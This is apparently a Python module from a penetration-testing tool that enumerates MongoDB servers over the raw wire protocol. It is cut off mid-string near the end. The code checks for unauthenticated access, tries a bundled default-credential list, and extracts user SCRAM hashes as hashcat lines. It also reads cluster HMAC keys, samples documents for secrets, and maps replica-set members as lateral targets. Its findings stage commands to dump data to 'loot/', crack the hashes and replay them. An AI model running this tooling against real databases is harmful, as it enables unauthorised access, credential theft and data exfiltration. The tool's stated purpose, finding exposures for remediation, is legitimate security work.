"""Deep MongoDB enumeration (stdlib only).

MongoDB wire protocol (OP_MSG, opcode 2013) with a minimal BSON encoder/decoder,
hand-rolled on a raw socket - no pymongo. Airgapped, stdlib only.

  * **hello / buildInfo:** version, replica-set role (always answerable).
  * **listDatabases WITHOUT authentication:** the discriminator. If it returns the
    database list, the instance is exposed unauthenticated - anyone on the network
    reads (and usually writes) every database. If it errors "not authorized", auth is
    enforced (recce reports it reachable-but-locked, not a finding).

Positive findings fold into the severity totals, the Vulnerabilities sheet, the
write-ups, a dedicated **MongoDB** tab, and the prove engine.
"""
from __future__ import annotations

import re
import socket
import struct

from ...core.models import Host, Port
from ..svccommon import finding_builder, recvn as _recvn

_PORTS = (27017, 27018, 27019)
_DEFAULT_PORT = 27017
_TIMEOUT = 5.0
_MAX_BSON_DEPTH = 100                                  # real replies nest a few levels;
                                                       # anything deeper is hostile.


def is_mongodb(port: Port) -> bool:
    if port.portid in _PORTS:
        return True
    return "mongo" in f"{port.service} {port.product}".lower()


# --- minimal BSON ---------------------------------------------------------------

def _cstr(s: str) -> bytes:
    return s.encode("utf-8") + b"\x00"


def _e_int32(name: str, v: int) -> bytes:
    return b"\x10" + _cstr(name) + struct.pack("<i", v)


def _e_str(name: str, v: str) -> bytes:
    b = v.encode("utf-8") + b"\x00"
    return b"\x02" + _cstr(name) + struct.pack("<i", len(b)) + b


def _e_bool(name: str, v: bool) -> bytes:
    return b"\x08" + _cstr(name) + (b"\x01" if v else b"\x00")


def _e_binary(name: str, v: bytes) -> bytes:
    return b"\x05" + _cstr(name) + struct.pack("<i", len(v)) + b"\x00" + v


def bson_doc(*elements: bytes) -> bytes:
    body = b"".join(elements)
    return struct.pack("<i", len(body) + 5) + body + b"\x00"


def bson_parse(data: bytes, i: int = 0, _depth: int = 0) -> tuple[dict, int]:
    """Parse a BSON document at offset i. Returns (dict, index-after-document).
    Hardened against a hostile/corrupt document: a negative or non-advancing length
    field is rejected instead of spinning the loop forever, and nesting is capped so
    a maliciously deep document can't blow the Python stack with a RecursionError
    that the caller (command) doesn't catch."""
    length = struct.unpack_from("<i", data, i)[0]
    if length < 5:                                     # a BSON doc is >= 5 bytes
        return {}, i + 4
    end = min(i + length, len(data))
    if _depth > _MAX_BSON_DEPTH:                        # refuse hostile nesting depth
        return {}, end
    i += 4
    out: dict = {}
    while i < end - 1:
        etype = data[i]
        i += 1
        j = data.index(0, i)
        name = data[i:j].decode("utf-8", "replace")
        i = j + 1
        if etype == 0x01:                              # double
            out[name] = struct.unpack_from("<d", data, i)[0]
            i += 8
        elif etype == 0x02:                            # string
            slen = struct.unpack_from("<i", data, i)[0]
            i += 4
            if slen < 1:                               # reject negative/zero -> no loop stall
                break
            out[name] = data[i:i + slen - 1].decode("utf-8", "replace")
            i += slen
        elif etype == 0x03:                            # embedded document
            out[name], i = bson_parse(data, i, _depth + 1)
        elif etype == 0x04:                            # array (doc with "0","1",... keys)
            sub, i = bson_parse(data, i, _depth + 1)
            # BSON arrays use decimal string keys; a hostile daemon could send
            # non-numeric ones. Sort numeric keys, keep any stragglers by insertion
            # order, rather than letting int() blow away the whole reply.
            out[name] = [sub[k] for k in sorted(sub, key=lambda x: (0, int(x))
                                                if x.isdigit() else (1, 0))]
        elif etype == 0x05:                            # binary
            blen = struct.unpack_from("<i", data, i)[0]
            if blen < 0:
                break
            out[name] = bytes(data[i + 5:i + 5 + blen])   # skip len(4) + subtype(1)
            i += 4 + 1 + blen
        elif etype == 0x07:                            # ObjectId
            out[name] = data[i:i + 12].hex()
            i += 12
        elif etype == 0x08:                            # bool
            out[name] = bool(data[i])
            i += 1
        elif etype == 0x09:                            # UTC datetime
            out[name] = struct.unpack_from("<q", data, i)[0]
            i += 8
        elif etype == 0x0A:                            # null
            out[name] = None
        elif etype == 0x10:                            # int32
            out[name] = struct.unpack_from("<i", data, i)[0]
            i += 4
        elif etype == 0x11:                            # timestamp
            out[name] = struct.unpack_from("<Q", data, i)[0]
            i += 8
        elif etype == 0x12:                            # int64
            out[name] = struct.unpack_from("<q", data, i)[0]
            i += 8
        else:                                          # unknown type - stop safely
            break
    return out, end


# --- OP_MSG wire ----------------------------------------------------------------

def op_msg(request_id: int, doc: bytes) -> bytes:
    body = struct.pack("<I", 0) + b"\x00" + doc        # flagBits=0, section kind 0 (body)
    header = struct.pack("<iiii", 16 + len(body), request_id, 0, 2013)
    return header + body




def command(sock, doc: bytes, request_id: int, timeout: float) -> dict | None:
    """Send one OP_MSG command, return the parsed BSON reply (or None)."""
    try:
        sock.sendall(op_msg(request_id, doc))
        sock.settimeout(timeout)
        hdr = _recvn(sock, 4)
        if len(hdr) < 4:
            return None
        length = struct.unpack("<i", hdr)[0]
        if length < 5 or length > 16 * 1024 * 1024:    # sane bound; a hostile daemon
            return None                                 # can't make us buffer ~2 GB
        rest = _recvn(sock, length - 4)
        msg = hdr + rest
        # The BSON body offset depends on the reply opcode: OP_MSG (2013) has
        # header(16) + flagBits(4) + kind(1) = 21; legacy OP_REPLY (1) has a 20-byte
        # reply header after the 16-byte msg header = 36. Read the opcode (bytes
        # 12..16) instead of assuming OP_MSG so pre-3.6 servers still fingerprint.
        opcode = struct.unpack_from("<i", msg, 12)[0]
        body_at = 36 if opcode == 1 else 21
        reply, _ = bson_parse(msg, body_at)
        return reply
    except (OSError, struct.error, IndexError, ValueError):
        return None


def _hello(sock, rid, timeout):
    return command(sock, bson_doc(_e_int32("hello", 1), _e_str("$db", "admin")),
                   rid, timeout)


def _build_info(sock, rid, timeout):
    return command(sock, bson_doc(_e_int32("buildInfo", 1), _e_str("$db", "admin")),
                   rid, timeout)


def _list_databases(sock, rid, timeout):
    return command(sock, bson_doc(_e_int32("listDatabases", 1), _e_str("$db", "admin")),
                   rid, timeout)


def _cmd(sock, name, rid, timeout, db="admin"):
    return command(sock, bson_doc(_e_int32(name, 1), _e_str("$db", db)), rid, timeout)


def _server_status_fingerprint(sock, timeout: float, rid: int) -> dict:
    """SAFE T2 proof-of-exploit read that corroborates hostInfo.

    Single controlled OP_MSG (`serverStatus` with the heavy sub-sections
    suppressed) that returns live process state - host FQDN:port, process
    name (mongod / mongos), pid, uptime, localTime, and mongod version -
    directly from the running server. Non-destructive, single-shot, honours
    the caller's socket timeout. Never raises."""
    ss = command(sock, bson_doc(
        _e_int32("serverStatus", 1),
        # Ask the server to skip the big analytics sections; keeps the reply
        # small (~1-2 KB) and inside our 16 MB length guard even on busy nodes.
        _e_bool("locks", False),
        _e_bool("metrics", False),
        _e_bool("wiredTiger", False),
        _e_bool("tcmalloc", False),
        _e_bool("mem", False),
        _e_bool("network", False),
        _e_bool("opLatencies", False),
        _e_bool("opcounters", False),
        _e_str("$db", "admin")), rid, timeout)
    if not isinstance(ss, dict) or ss.get("ok") != 1.0:
        return {}
    out: dict = {}
    for k in ("host", "process", "version", "localTime"):
        v = ss.get(k)
        if isinstance(v, str) and v:
            out[k] = v
    for k in ("pid", "uptime"):
        v = ss.get(k)
        if isinstance(v, (int, float)) and v > 0:
            out[k] = int(v)
    return out


def _scram_hashcat(username: str, mechanism: str, cred: dict) -> str:
    """Format a MongoDB SCRAM credential (from usersInfo showCredentials) as a hashcat
    line: mode 24100 for SCRAM-SHA-1 (`*0*`), mode 24200 for SCRAM-SHA-256 (`*1*`).
    Layout: $mongodb-scram$*<0|1>*<b64 user>*<iterations>*<b64 salt>*<b64 serverKey>."""
    import base64
    if not isinstance(cred, dict):
        return ""
    it = cred.get("iterationCount")
    salt = cred.get("salt")
    server_key = cred.get("serverKey")
    if not (it and salt and server_key):
        return ""
    mode = "1" if "256" in mechanism else "0"
    ub = base64.b64encode(username.encode()).decode()
    return f"$mongodb-scram$*{mode}*{ub}*{it}*{salt}*{server_key}"


def _mongo_scram(sock, user: str, password: str, mechanism: str, rid: int,
                 timeout: float) -> bool:
    """One SCRAM conversation (saslStart -> saslContinue*) on `sock`. Returns True on a
    completed, mutually-verified authentication. Never raises."""
    from ...ad import scram
    try:
        pw = scram.mongo_sha1_secret(user, password) if "SHA-1" in mechanism else password
        client = scram.ScramClient(user, pw, mechanism)
        first = client.first_message().encode()
        r = command(sock, bson_doc(
            _e_int32("saslStart", 1), _e_str("mechanism", mechanism),
            _e_binary("payload", first), _e_int32("autoAuthorize", 1),
            _e_str("$db", "admin")), rid, timeout)
        if not isinstance(r, dict) or r.get("ok") != 1.0:
            return False
        conv = r.get("conversationId")
        server_first = (r.get("payload") or b"")
        final = client.final_message(server_first.decode("utf-8", "replace")).encode()
        r2 = command(sock, bson_doc(
            _e_int32("saslContinue", 1), _e_int32("conversationId", int(conv or 0)),
            _e_binary("payload", final), _e_str("$db", "admin")), rid + 1, timeout)
        if not isinstance(r2, dict) or r2.get("ok") != 1.0:
            return False
        if not client.verify((r2.get("payload") or b"").decode("utf-8", "replace")):
            return False
        if r2.get("done"):
            return True
        r3 = command(sock, bson_doc(
            _e_int32("saslContinue", 1), _e_int32("conversationId", int(conv or 0)),
            _e_binary("payload", b""), _e_str("$db", "admin")), rid + 2, timeout)
        return isinstance(r3, dict) and r3.get("ok") == 1.0 and bool(r3.get("done"))
    except (ValueError, KeyError, struct.error):
        return False


def authenticate(ip: str, port: int = _DEFAULT_PORT, user: str = "", password: str = "",
                 timeout: float = _TIMEOUT) -> bool:
    """Try one credential against MongoDB (SCRAM-SHA-256 then SCRAM-SHA-1). No data is
    read; the socket is dropped after the handshake completes."""
    for mech in ("SCRAM-SHA-256", "SCRAM-SHA-1"):
        try:
            with socket.create_connection((ip, port), timeout=timeout) as s:
                if _mongo_scram(s, user, password, mech, 20, timeout):
                    return True
        except OSError:
            return False
    return False


# Small, targeted default-cred list — same shape as the Postgres/MSSQL weak
# sweeps. Fires only when the tester supplies no credentials AND the instance
# rejects the unauth probe (i.e. reachable-but-locked). MongoDB has no
# built-in lockout by default so a 4-attempt sweep is safe.
_WEAK_MONGO_CREDS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("mongo", "mongo"),
    ("test", "test"),
    ("mongoadmin", "secret"),        # bitnami default
]


def weak_password_sweep(ip: str, port: int = _DEFAULT_PORT,
                        timeout: float = _TIMEOUT,
                        extra_creds: list[tuple[str, str]] | None = None
                        ) -> tuple[str, str] | None:
    """Try each entry in _WEAK_MONGO_CREDS (+ any user-supplied `extra_creds`)
    via SCRAM. Returns the first (user, password) pair that authenticates, or
    None. Called only when probe() reports auth-required and no engagement
    credentials worked."""
    creds = list(_WEAK_MONGO_CREDS) + list(extra_creds or [])
    for user, password in creds:
        try:
            if authenticate(ip, port, user, password, timeout=timeout):
                return (user, password)
        except OSError:
            continue
    return None


def probe_creds(ip: str, port: int, user: str, password: str,
                timeout: float = _TIMEOUT) -> dict:
    """Credentialed probe: authenticate, then run the same deep enumeration as the
    unauth path. Returns {reachable, cred_access, cred_user, version, databases, users,
    hashes, ...} or {} if unreachable."""
    out: dict = {"reachable": False, "cred_access": False, "cred_user": user}
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            hello = _hello(s, 1, timeout)
            if not isinstance(hello, dict) or "maxWireVersion" not in hello:
                return {}
            out["reachable"] = True
            if not _mongo_scram(s, user, password, "SCRAM-SHA-256", 20, timeout) and \
                    not _mongo_scram(s, user, password, "SCRAM-SHA-1", 30, timeout):
                return out
            out["cred_access"] = True
            bi = _build_info(s, 40, timeout)
            out["version"] = (bi or {}).get("version", "")
            out["js_engine"] = (bi or {}).get("javascriptEngine", "")
            ld = _list_databases(s, 41, timeout)
            if isinstance(ld, dict) and isinstance(ld.get("databases"), list):
                out["databases"] = [{"name": d.get("name", ""),
                                     "size": d.get("sizeOnDisk", 0)}
                                    for d in ld["databases"] if isinstance(d, dict)]
            _deep_mongo(s, out, timeout)
    except OSError:
        return out
    return out


def _flatten(doc, prefix: str = "", depth: int = 0):
    """Yield (dotted_field_name, value) for a BSON doc, descending into subdocuments."""
    if depth > 6 or not isinstance(doc, dict):
        return
    for k, v in doc.items():
        key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict):
            yield from _flatten(v, key, depth + 1)
        else:
            yield key, v


def _batch(cursor_field):
    """listCollections/find return cursor.firstBatch, which bson_parse renders as a dict
    with numeric keys (arrays) or a list. Normalize to a list of dicts."""
    if isinstance(cursor_field, dict):
        return [v for v in cursor_field.values() if isinstance(v, dict)]
    if isinstance(cursor_field, list):
        return [v for v in cursor_field if isinstance(v, dict)]
    return []


def datamine(ip: str, port: int, dbs: list[str], timeout: float = _TIMEOUT,
             user: str | None = None, password: str | None = None,
             max_dbs: int = 6, max_colls: int = 12, max_docs: int = 3) -> dict:
    """Read-only secret hunting across the accessible databases: list collections, sample
    a few documents, flag fields whose name denotes secrets/PII (sampled REDACTED), and
    harvest embedded connection strings. Uses SCRAM auth when creds are supplied."""
    from .postgres import _CONNSTR, _SECRET_COL, _redact
    out = {"secret_fields": [], "samples": [], "harvested": []}
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            if not isinstance(_hello(s, 1, timeout), dict):
                return out
            if user and not _mongo_scram(s, user, password, "SCRAM-SHA-256", 50, timeout) \
                    and not _mongo_scram(s, user, password, "SCRAM-SHA-1", 60, timeout):
                return out
            rid = 100
            for db in [d for d in dbs if d not in ("local", "config")][:max_dbs]:
                lc = command(s, bson_doc(_e_int32("listCollections", 1),
                                         _e_str("$db", db)), rid, timeout)
                rid += 1
                colls = [c.get("name", "") for c in _batch(
                    (lc or {}).get("cursor", {}).get("firstBatch"))]
                for coll in [c for c in colls
                             if c and not c.startswith("system.")][:max_colls]:
                    fr = command(s, bson_doc(_e_str("find", coll),
                                             _e_int32("limit", max_docs),
                                             _e_str("$db", db)), rid, timeout)
                    rid += 1
                    if not isinstance(fr, dict):
                        continue
                    docs = _batch(fr.get("cursor", {}).get("firstBatch"))
                    hit, sample = [], {}
                    for doc in docs:
                        for field, val in _flatten(doc):
                            if _SECRET_COL.search(field):
                                if field not in sample:
                                    hit.append(field)
                                    sample[field] = _redact(val)
                            for m in _CONNSTR.finditer(str(val or "")):
                                out["harvested"].append(m.group(0))
                    for f in hit:
                        out["secret_fields"].append(
                            {"db": db, "collection": coll, "field": f})
                    if sample:
                        keys = list(sample)[:6]
                        out["samples"].append({
                            "db": db, "collection": coll, "fields": keys,
                            "redacted": {k: sample[k] for k in keys}})
    except OSError:
        pass
    seen: set = set()
    out["harvested"] = [c for c in out["harvested"]
                        if not (c in seen or seen.add(c))]
    return out


def _deep_mongo(sock, out: dict, timeout: float) -> None:
    """Read-only deep enumeration on an unauthenticated MongoDB: captured user accounts
    (+ credential mechanisms), replica-set members (lateral targets), and the on-disk
    config (whether auth is even configured). Populates out[users|replset|replset_members
    |auth_configured|bind_ip|js_engine]. Never raises."""
    # usersInfo on admin with showCredentials: dump accounts, roles AND the SCRAM
    # key material (salt/iterations/serverKey) -> crackable hashcat lines.
    ui = command(sock, bson_doc(_e_int32("usersInfo", 1), _e_bool("showCredentials", True),
                                _e_str("$db", "admin")), 10, timeout)
    users, hashes = [], []
    if isinstance(ui, dict) and isinstance(ui.get("users"), list):
        for u in ui["users"]:
            if not isinstance(u, dict):
                continue
            creds = u.get("credentials")
            mechs = list(creds.keys()) if isinstance(creds, dict) else []
            roles = [r.get("role", "") for r in u.get("roles", [])
                     if isinstance(r, dict)]
            uname = u.get("user", "")
            users.append({"user": uname, "db": u.get("db", ""),
                          "roles": roles, "mechanisms": mechs})
            if isinstance(creds, dict):
                for mech, c in creds.items():
                    hc = _scram_hashcat(uname, mech, c)
                    if hc:
                        hashes.append({"user": uname, "mechanism": mech, "hashcat": hc})
    out["users"] = users
    out["hashes"] = hashes
    # replSetGetStatus: replica-set members are additional lateral targets.
    rs = _cmd(sock, "replSetGetStatus", 11, timeout)
    if isinstance(rs, dict) and rs.get("ok") == 1.0:
        out["replset"] = rs.get("set", "")
        out["replset_members"] = [m.get("name", "") for m in rs.get("members", [])
                                  if isinstance(m, dict)]
    # getCmdLineOpts: is authentication even configured? what interface is it bound to?
    opts = _cmd(sock, "getCmdLineOpts", 12, timeout)
    if isinstance(opts, dict) and isinstance(opts.get("parsed"), dict):
        parsed = opts["parsed"]
        sec = parsed.get("security") if isinstance(parsed.get("security"), dict) else {}
        out["auth_configured"] = bool(sec.get("authorization") == "enabled")
        net = parsed.get("net") if isinstance(parsed.get("net"), dict) else {}
        out["bind_ip"] = str(net.get("bindIp", ""))
    # replSetGetConfig: full replica-set config including the keyFile-driven
    # cluster auth secret hash. `getShardMap`: sharded-cluster topology (all
    # mongos + config server addresses). Both are unauth-readable on legacy
    # exposures; findings surface them as lateral-target inventory.
    rsc = _cmd(sock, "replSetGetConfig", 13, timeout)
    if isinstance(rsc, dict) and rsc.get("ok") == 1.0:
        cfg = rsc.get("config") or {}
        if isinstance(cfg, dict):
            out["replset_config"] = {
                "id": cfg.get("_id", ""),
                "version": cfg.get("version"),
                "protocol_version": cfg.get("protocolVersion"),
                "member_count": len(cfg.get("members") or []),
            }
    sm = _cmd(sock, "getShardMap", 14, timeout)
    if isinstance(sm, dict) and sm.get("ok") == 1.0 and isinstance(sm.get("map"), dict):
        # `map` keys: shard names -> "host1:27017,host2:27017". Flatten unique hosts.
        hosts: set[str] = set()
        for v in sm["map"].values():
            if isinstance(v, str):
                for h in v.split(","):
                    h = h.strip()
                    if h:
                        hosts.add(h)
        out["shard_hosts"] = sorted(hosts)
    # Server-side JavaScript surface: getParameter("scripting") tells you if
    # $where / mapReduce / eval are runnable. Enabled = RCE primitive on old
    # servers (CVE-2013-1892 era) and a NoSQLi amplifier on modern ones.
    gp = command(sock, bson_doc(_e_int32("getParameter", 1),
                                _e_bool("scripting", True),
                                _e_str("$db", "admin")), 15, timeout)
    if isinstance(gp, dict) and gp.get("ok") == 1.0 and "scripting" in gp:
        out["scripting_enabled"] = bool(gp.get("scripting"))
    # Collection inventory per database — not just secret-field samples the
    # datamine() step surfaces. Bounded so a huge cluster doesn't stall the
    # probe; the runbook covers the full dump.
    dbs = out.get("databases") or []
    inv: dict[str, list[str]] = {}
    rid = 20
    for d in dbs[:8]:
        name = d.get("name") if isinstance(d, dict) else None
        if not name or name in ("local", "config"):
            continue
        lc = command(sock, bson_doc(_e_int32("listCollections", 1),
                                    _e_str("$db", name)), rid, timeout)
        rid += 1
        colls = [c.get("name", "") for c in _batch(
            (lc or {}).get("cursor", {}).get("firstBatch"))
            if isinstance(c, dict) and c.get("name")
            and not c["name"].startswith("system.")]
        if colls:
            inv[name] = colls[:20]
    if inv:
        out["collection_inventory"] = inv
    # hostInfo: OS fingerprint + FQDN. Unauth-readable on exposed instances and
    # readable by any principal with hostManager/clusterMonitor. One BSON round
    # trip; feeds cross-service hostname / OS-family pools.
    hi = _cmd(sock, "hostInfo", 30, timeout)
    if isinstance(hi, dict) and hi.get("ok") == 1.0:
        sysd = hi.get("system") if isinstance(hi.get("system"), dict) else {}
        osd = hi.get("os") if isinstance(hi.get("os"), dict) else {}
        info = {
            "hostname": str(sysd.get("hostname", "") or ""),
            "os_type": str(osd.get("type", "") or ""),
            "os_name": str(osd.get("name", "") or ""),
            "os_version": str(osd.get("version", "") or ""),
        }
        if any(info.values()):
            out["host_info"] = info
    # T2 corroboration: a second SAFE controlled admin read that returns live
    # process state (host FQDN:port, "mongod"/"mongos", pid, uptime, localTime,
    # version). Proves the hostInfo values came from a live server socket, not
    # a stale config file — one command, no writes, bounded.
    ss = _server_status_fingerprint(sock, timeout, 33)
    if ss:
        out.setdefault("host_info", {})["server_status"] = ss
    # getLog: 'startupWarnings' — the server's OWN list of insecure-config
    # warnings ('access control not enabled', 'listening on all interfaces',
    # THP misconfigured, mmapv1 deprecated, weak TLS, ...). Unauth-readable on
    # exposed instances. Free finding: the server tells you what is wrong.
    gl = command(sock, bson_doc(_e_str("getLog", "startupWarnings"),
                                _e_str("$db", "admin")), 31, timeout)
    if isinstance(gl, dict) and gl.get("ok") == 1.0:
        lines = gl.get("log")
        if isinstance(lines, list):
            warnings = [ln for ln in lines if isinstance(ln, str) and ln.strip()]
            if warnings:
                out["startup_warnings"] = warnings[:40]     # cap
    # local.system.keys: the cluster-internal HMAC keys (post-3.6 keyfile
    # replacement). Reading them yields the `__system` cluster credential —
    # replay to every replset member / mongos. `find` on local.system.keys
    # returns docs with _id (keyId int64), purpose ('HMAC'), key (BinData), and
    # expiresAt. Only harvestable on unauth exposures or accounts with `read`
    # on `local`; either is a critical primitive.
    ck = command(sock, bson_doc(_e_str("find", "system.keys"),
                                _e_int32("limit", 10),
                                _e_str("$db", "local")), 32, timeout)
    if isinstance(ck, dict) and ck.get("ok") == 1.0:
        docs = _batch((ck.get("cursor") or {}).get("firstBatch"))
        keys = []
        for d in docs:
            kv = d.get("key")
            if isinstance(kv, (bytes, bytearray)) and len(kv) >= 8:
                import base64 as _b64
                keys.append({
                    "keyId": str(d.get("_id", "")),
                    "purpose": str(d.get("purpose", "") or ""),
                    "key_b64": _b64.b64encode(bytes(kv)).decode(),
                    "key_len": len(kv),
                })
        if keys:
            out["cluster_keys"] = keys


# --- probe ----------------------------------------------------------------------

def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict | None:
    """Unauthenticated MongoDB probe. Returns None if the port didn't speak MongoDB."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            hello = _hello(s, 1, timeout)
            if not isinstance(hello, dict) or "maxWireVersion" not in hello:
                return None                            # not MongoDB
            out = {"ip": ip, "port": port,
                   "primary": bool(hello.get("isWritablePrimary")
                                   or hello.get("ismaster")),
                   "set_name": hello.get("setName", ""),
                   "max_wire": hello.get("maxWireVersion")}
            bi = _build_info(s, 2, timeout)
            out["version"] = (bi or {}).get("version", "")
            out["js_engine"] = (bi or {}).get("javascriptEngine", "")
            ld = _list_databases(s, 3, timeout)
            if isinstance(ld, dict) and ld.get("ok") == 1.0 and "databases" in ld:
                out["unauth"] = True
                out["databases"] = [{"name": d.get("name", ""),
                                     "size": d.get("sizeOnDisk", 0)}
                                    for d in ld["databases"] if isinstance(d, dict)]
                out["total_size"] = ld.get("totalSize", 0)
                _deep_mongo(s, out, timeout)
            else:
                out["unauth"] = False
                out["auth_error"] = (ld or {}).get("errmsg", "") if isinstance(ld, dict) else ""
            return out
    except OSError:
        return None


def mongodb_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_mongodb(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product or "", "version": p.version or ""})
    return out


# --- narratives + findings ------------------------------------------------------

_NARRATIVE = {
    "mongo_unauth": (
        "The MongoDB instance accepts commands with no authentication - recce listed "
        "every database without a credential. That means full read (and, by default, "
        "write) access to all data: dump collections, exfiltrate PII/secrets, tamper "
        "with or ransom the data. This is one of the most common and highest-impact "
        "internet/intranet exposures. Enable authentication (--auth) and bind the "
        "listener to a trusted interface immediately."),
    "mongo_version": (
        "The MongoDB build is old / end-of-life. Beyond the missing security fixes, "
        "pre-2.6 defaults exposed the HTTP/REST interfaces and pre-3.0 shipped with no "
        "authentication out of the box - confirm the running config and upgrade."),
    "mongo_weak_default": (
        "The MongoDB instance is protected by authentication but still accepts a "
        "well-known default credential (admin/admin, root/root, mongo/mongo class). "
        "Same blast radius as an unauth exposure — full read/write, credential "
        "harvest, replica-set pivot. Rotate the credential immediately."),
    "mongo_scripting_enabled": (
        "Server-side JavaScript is enabled (scripting=true). The server will execute "
        "arbitrary JS inside $where clauses, mapReduce jobs, and (on legacy builds) "
        "the `eval` command. Any endpoint that reflects user input into a query "
        "becomes an RCE primitive; on 3.x and earlier, `eval` on an unauth instance "
        "was direct code execution. Disable scripting (--noscripting or "
        "security.javascriptEnabled: false) unless an application demands it."),
    "mongo_shard_topology": (
        "The unauth probe recovered the sharded-cluster topology (getShardMap). All "
        "mongos + config-server addresses are now known to the attacker — same "
        "credentials or exposure typically apply cluster-wide, so this is a "
        "lateral-target inventory. Bind the cluster interfaces to a trusted network."),
    "mongo_hostinfo": (
        "The MongoDB instance disclosed a full OS/host fingerprint via hostInfo: "
        "OS name and version, kernel type, and the server's own hostname (often "
        "the internal FQDN). Feeds SSH/SMB/RDP spraying with the exact hostname, "
        "and picks Linux-vs-Windows follow-on. Restrict hostInfo to trusted roles "
        "and remove the unauth exposure."),
    "mongo_startup_warnings": (
        "The MongoDB server itself reports insecure-configuration warnings via "
        "getLog:'startupWarnings' - auth-off, all-interfaces bind, weak TLS, "
        "deprecated storage engines, and similar. Treat every listed line as an "
        "explicit misconfiguration finding to remediate."),
    "mongo_cluster_keyfile": (
        "The instance exposed local.system.keys - the cluster-internal HMAC "
        "keys used by every mongod/mongos node to authenticate to each other "
        "as the reserved `__system` account. Replaying this key against any "
        "replica-set member or mongos yields cluster-wide impersonation and, "
        "with __system's implicit privileges, effective RCE-adjacent lateral "
        "movement across the entire deployment. Bind local to a trusted "
        "network, enforce auth on every node, and rotate the keyFile."),
    "mongo_collection_inventory": (
        "recce enumerated collection names across every accessible database. Even "
        "when individual documents don't obviously leak PII, the collection names "
        "themselves reveal the data model — `sessions`, `payments`, `password_reset`, "
        "`api_keys`, `users` — which is enough to plan a targeted dump. Rate limit "
        "listCollections at the network layer or lock down the account."),
}


TESTING_NARRATIVE = [
    ("1. Handshake (stdlib OP_MSG / BSON)",
     "recce speaks the MongoDB wire protocol directly - no pymongo. It sends hello + "
     "buildInfo to read the version and replica-set role."),
    ("2. Unauthenticated access test",
     "It runs listDatabases with no credential. If the database list comes back, the "
     "instance is exposed unauthenticated (critical); an 'authorized' error means auth "
     "is enforced (reachable but locked - not a finding)."),
    ("3. Vulnerability identification",
     "An unauthenticated instance is a CONFIRMED critical exposure with the database "
     "inventory captured. An old/EOL build is flagged for its default-open history."),
    ("4. Runbook",
     "The exact follow-on commands (mongosh, mongodump, nmap mongodb-databases) are "
     "staged per endpoint."),
]


_finding = finding_builder("mongodb", _NARRATIVE)


def _old_version(ver: str) -> bool:
    try:
        major = int(ver.split(".")[0])
        return major < 4
    except (ValueError, IndexError):
        return False


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_mongodb(p):
                continue
            pr = probes.get((h.ip, p.portid)) or {}
            if not pr:
                continue
            tgt = f"{h.ip}:{p.portid}"
            ver = pr.get("version", "")
            if pr.get("unauth"):
                dbs = pr.get("databases") or []
                names = ", ".join(d["name"] for d in dbs[:12])
                # Deeper: accounts, replica-set topology and config captured read-only.
                extra = ""
                users = pr.get("users") or []
                hashes = pr.get("hashes") or []
                if users:
                    named = ", ".join(u["user"] for u in users[:8] if u.get("user"))
                    extra += (f"\n\nCAPTURED {len(users)} user account(s) via usersInfo"
                              + (f": {named}" if named else "")
                              + (f"; {len(hashes)} crackable SCRAM hash(es) extracted "
                                 "(hashcat -m 24100/24200)" if hashes else
                                 " (roles + credential mechanisms; privilege map)")
                              + ".")
                members = pr.get("replset_members") or []
                if members:
                    extra += (f"\n\nReplica set '{pr.get('replset', '')}' - "
                              f"{len(members)} member(s) (lateral targets): "
                              + ", ".join(members[:6]) + ".")
                if pr.get("auth_configured") is False:
                    extra += ("\n\ngetCmdLineOpts confirms authentication is NOT "
                              "configured (security.authorization absent)"
                              + (f"; bound to {pr.get('bind_ip')}" if pr.get("bind_ip") else "")
                              + ".")
                if pr.get("js_engine"):
                    extra += (f"\n\nServer-side JavaScript engine: {pr['js_engine']} "
                              "($where / mapReduce available for query-side code exec).")
                out.append(_finding(
                    "critical", "MongoDB exposed without authentication", tgt,
                    f"recce listed {len(dbs)} database(s) with no credential"
                    + (f" (version {ver})" if ver else "") + f": {names}. Full "
                    "unauthenticated read/write access to all data." + extra,
                    "mongosh / mongodump",
                    f"mongosh mongodb://{h.ip}:{p.portid}/ --eval 'db.adminCommand("
                    "{usersInfo:1})'   # then mongodump --host "
                    f"{h.ip} --port {p.portid} --out loot/",
                    "Enable authentication (security.authorization: enabled), create "
                    "admin users, and bind the listener to a trusted interface only.",
                    ["CWE-306", "CWE-284"], kind="mongo_unauth",
                    exploit_note=(
                        "mongodump --host <ip> --port <port> --out loot/ ; then "
                        "hashcat -m 24200 loot/hashes -a 0 rockyou.txt and replay "
                        "any cracked pair against other mongod ports discovered in "
                        "scope."),
                    depth_tier="t2"))
            elif pr.get("cred_access"):
                dbs = pr.get("databases") or []
                who = pr.get("cred_user", "?")
                users = pr.get("users") or []
                hashes = pr.get("hashes") or []
                extra = ""
                if users:
                    extra += (f" Enumerated {len(users)} account(s)"
                              + (f"; {len(hashes)} SCRAM hash(es) extracted (hashcat "
                                 "-m 24100/24200)" if hashes else "") + ".")
                # A weak-default hit is a bigger deal than a looted-cred hit —
                # the operator never had to leave the target to log in. Bump
                # severity to critical and mark the finding distinctly.
                if pr.get("cred_source") == "weak_default":
                    out.append(_finding(
                        "critical", f"MongoDB accepts default credential '{who}'", tgt,
                        f"recce authenticated as '{who}' with a well-known default "
                        "password (bundled 6-cred sweep, no engagement credential "
                        "supplied)"
                        + (f" - version {ver}" if ver else "")
                        + f". {len(dbs)} database(s) accessible." + extra
                        + " Same blast radius as an unauth exposure.",
                        "mongosh",
                        f"mongosh 'mongodb://{who}:<pass>@{h.ip}:{p.portid}/"
                        "?authSource=admin'",
                        "Rotate this credential IMMEDIATELY, enforce SCRAM-SHA-256, "
                        "and bind the listener to a trusted interface.",
                        ["CWE-521", "CWE-798"], kind="mongo_weak_default",
                        exploit_note=(
                            "mongosh 'mongodb://<user>:<pw>@<ip>:<port>/"
                            "?authSource=admin' --eval 'db.adminCommand({usersInfo:1,"
                            "showCredentials:true})' ; then mongodump with the same "
